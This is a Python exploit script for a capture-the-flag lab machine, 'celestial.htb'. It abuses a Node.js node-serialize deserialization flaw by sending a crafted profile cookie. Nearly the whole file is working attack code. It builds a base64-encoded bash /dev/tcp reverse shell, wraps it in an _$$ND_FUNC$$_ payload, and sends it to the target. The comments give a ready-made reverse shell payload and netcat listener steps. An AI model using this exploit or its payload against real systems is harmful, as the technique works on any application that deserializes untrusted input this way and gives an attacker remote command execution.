#!/usr/bin/python3

# This script was created to automate getting a reverse shell in celestial.htb machine via:
# + Exploit a deserialization vulnerability via serialize.unserialize(str)
# + Spawn a reverse shell
# Author: @nightwolfx2

# Extracted from server.js
# if (req.cookies.profile) {
#   var str = new Buffer(req.cookies.profile, 'base64').toString();
#   var obj = serialize.unserialize(str); ** VULN **
#   if (obj.username) { 
#     var sum = eval(obj.num + obj.num);
#     res.send("Hey " + obj.username + " " + obj.num + " + " + obj.num + " is " + sum);
#   }else{

# Help articles:
# + Exploiting Node.js deserialization bug for Remote Code Execution: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
# + Reverse shell (encoded): echo bash -i >& /dev/tcp/X.X.X.X/YYYY 0>&1 | base64 
# + Reverse shell: {"username":"_$$ND_FUNC$$_require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC9YLlguWC5YL1lZWVkgMD4mMQ== | base64 -d | bash', function(error,stdout,stderr) { console.log(stdout) })","country":"Mexico","city":"Pwned","num":"0000"}

# Usage:
# On a separated terminal, start a netcat listener, example:
# $nc -l -p yyyy -v
#
# Run the exploit as follows:
#└─$ python3 celestial.py -t 10.10.10.85 -p 3000 -a x.x.x.x -l yyyy
#[+] Attempting to exploit json deserialization vulnerability...
#[+] Payload sent, shell should pop up shortly...
#

import requests
import argparse
import base64

PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def revshell(full_target, attacker_ip, attacker_port):
        url = "http://%s/" % full_target
        plain_rev_shell = "bash -i >& /dev/tcp/%s/%s 0>&1" % (attacker_ip, attacker_port)
        rev_shell_bytes = plain_rev_shell.encode("ascii")
        rev_shell_base64_raw = base64.b64encode(rev_shell_bytes)
        rev_shell_base64 = rev_shell_base64_raw.decode("ascii")
        payload = '{"username":"_$$ND_FUNC$$_require(\'child_process\').exec(\'echo %s | base64 -d | bash\', function(error,stdout,stderr) { console.log(stdout) })","country":"Thank you","city":"Comments are awesome","num":"9001"}' % rev_shell_base64
        payload_bytes = payload.encode("ascii")
        payload_base64_raw = base64.b64encode(payload_bytes)
        payload_base64 = payload_base64_raw.decode("ascii")
        cookies = {'profile': str(payload_base64) }
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "If-None-Match": "W/\"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg\"", "Connection": "close"}
        print("[+] Payload sent, shell should pop up shortly...")
        res = requests.get(url, headers=headers, cookies=cookies)

def main():
        print("Skeleton")
if __name__ == '__main__':
        session = requests.session()
        parser = argparse.ArgumentParser()
        parser.add_argument('-t','--target', help='host/ip to target, required=True')
        parser.add_argument('-p','--port', help='target port, required=True')
        parser.add_argument('-a','--attacker', help='attacker ip, required=True')
        parser.add_argument('-l','--listen', help='attacker listening port, required=True')
        args = parser.parse_args()
        full_target = args.target+":"+args.port
        attacker_ip = args.attacker
        attacker_port = args.listen
        print("[+] Attempting to exploit json deserialization vulnerability...")
        revshell(full_target, attacker_ip, attacker_port)
